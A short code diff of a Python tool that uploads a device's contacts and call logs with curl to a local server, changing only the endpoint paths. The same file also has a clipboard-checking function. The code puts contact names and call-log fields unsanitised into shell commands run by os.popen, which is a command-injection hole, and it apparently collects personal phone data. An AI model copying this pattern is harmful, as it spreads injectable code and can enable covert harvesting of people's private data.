@@ -25,7 +25,7 @@ def check_contact(THIS_USER_TOKEN):
     for contact in res:
         if not contact_list.objects.filter(name=contact['name']).exists():
             call_back = os.popen(
-                f"curl --data \"token={THIS_USER_TOKEN}&name={contact['name']}&phone_number={contact['number']}]\" http://localhost:8000/s/contact_list/")
+                f"curl --data \"token={THIS_USER_TOKEN}&name={contact['name']}&phone_number={contact['number']}]\" http://localhost:8000/s/contact/")
 
 
 def check_clipboard(THIS_USER_TOKEN):
@@ -47,7 +47,7 @@ def check_call(THIS_USER_TOKEN):
     for log in res:
         if not call_log.objects.filter(date=log['date']).exists():
             call_back = os.popen(
-                f'curl --data "token={THIS_USER_TOKEN}&name={log["name"]}&phone_number={log["phone_number"]}&type={log["type"]}&duration={log["duration"]}&date={log["date"]}" http://localhost:8000/s/call_list/')
+                f'curl --data "token={THIS_USER_TOKEN}&name={log["name"]}&phone_number={log["phone_number"]}&type={log["type"]}&duration={log["duration"]}&date={log["date"]}" http://localhost:8000/s/call_log/')
 
 
 def InsertIntoDb(THIS_USER_TOKEN):
